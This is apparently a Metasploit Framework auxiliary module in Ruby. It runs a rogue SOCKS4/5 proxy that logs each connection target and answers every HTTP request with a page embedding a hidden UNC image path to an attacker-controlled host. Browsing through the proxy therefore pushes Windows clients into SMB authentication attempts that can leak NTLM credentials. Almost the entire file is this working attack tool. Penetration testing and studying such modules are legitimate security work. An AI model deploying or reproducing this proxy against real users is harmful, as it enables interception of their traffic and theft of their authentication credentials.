##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report


  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'SOCKS Proxy UNC Path Redirection',
            'Description'    => %q{
              This module provides a Socks proxy service
              that redirects all HTTP requests to a web page that
              loads a UNC path.
            },
            'Author'      => 'hdm',
            'License'     => MSF_LICENSE,
            'Actions'     =>
                [
                    [ 'Proxy' ]
                ],
            'PassiveActions' =>
                [
                    'Proxy'
                ],
            'DefaultAction'  => 'Proxy'
        )
    )

    register_options(
      [
        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 1080 ]),
        OptString.new('UNCHOST',    [ false, "The address of the UNC host.", nil ])
      ], self.class)
  end

  def setup
    super
    @state = {}
  end

  def on_client_connect(client)
#		print_status("New connection from #{client.peerhost}:#{client.peerport}")
  end

  def on_client_data(client)
#		print_status("Data from #{client.peerhost}:#{client.peerport}")
    process_socks(client)
  end

  def on_client_close(client)
#		print_status("Closed connection from #{client.peerhost}:#{client.peerport}")
  end

  def run
    exploit()
  end

  def reject(client)
    rej = "\x00\x5b" + ("\x00" * 6)
    client.put rej
    true
  end

  def process_socks(client)
    req = client.get_once
    return if !(req and req.length > 2)

    # Versions
    case req[0,1]
    when "\x04"

      sver, sreq, sport, shost, suser, sname = req.unpack('CCnA4Z*Z*')

      # Handle connections only
      if (sreq != 0x01)
        return reject(client)
      end

      # Handle socks4a
      if (shost[0,3] == "\x00\x00\x00")
        shost = sname
      else
        shost = shost.unpack('C*').join('.')
      end

      print_status("Connection attempt from #{client.peerhost}:#{client.peerport} to #{shost}:#{sport} #{suser.inspect}")

      client.put("\x00\x5a\x00\x00\x00\x00\x00\x00")

    when "\x05"

      sver, scnt, sauth = req.unpack('CCA*')
      client.put("\x05\x00")

      req = client.get_once

      sver, sreq, sdmp, stype = req.unpack('CCCC')

      # Handle connections only
      if (sreq != 0x01)
        return reject(client)
      end

      saddr = req[4,req.length - 4]
      case stype
      when 0x01
        shost = req[4,4].unpack('C*').join('.')
        sport = req[8,2].unpack('n')[0]

      when 0x03
        shostlen = req[4]
        shost    = req[5, shostlen]
        sport    = req[5+shostlen, 2].unpack('n')[0]

      when 0x04
        shost = req[4,16].unpack('n').map{ |x| "%.2x" % x }.join(':')
        sport = req[20,2].unpack('n')[0]
      end

      print_status("Connection attempt from #{client.peerhost}:#{client.peerport} to #{shost}:#{sport}")

      res = "\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"
      client.put res

    else
      return reject(client)
    end


    req = client.get_once
    hed = req ? req.split(/\n/)[0].strip : ''
    host     = datastore['UNCHOST'] || Rex::Socket.source_address(client.peerhost)
    share    = Rex::Text.rand_text_alpha(8)
    filename = Rex::Text.rand_text_alpha(8)

    print_status("Request from #{client.peerhost}:#{client.peerport}: #{hed}")

    body = %Q|
      <html><head><title>#{Rex::Text.rand_text_alpha(8)}</title><head><body>
        <img src="\\\\#{host}\\#{share}\\#{filename}.jpg" style="visibility: hidden;">
      </body>
      </html>
    |.gsub(/\s+/, ' ')

    res  = "HTTP/1.1 200 OK\r\n"
    res << "Content-Type: text/html\r\n"
    res << "Connection: Close\r\n"
    res << "Content-Length: #{body.length}\r\n\r\n#{body}"

    client.put(res)
  end



end
